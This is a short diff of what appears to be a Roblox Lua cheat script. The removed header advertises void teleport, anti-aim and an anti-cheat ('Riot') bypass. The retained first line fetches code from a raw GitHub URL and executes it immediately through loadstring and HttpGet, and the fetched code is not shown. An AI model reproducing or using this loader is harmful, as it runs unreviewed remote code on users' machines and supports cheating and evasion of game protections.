@@ -1,7 +1,3 @@
--- ASTRAL.WTF | VOID HIDE ULTIMATE
--- Developed by @s39z_
--- Premium Void Teleport + Anti-Aim + Riot Bypass
-
 local Teleport = loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/1.txt"))()
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
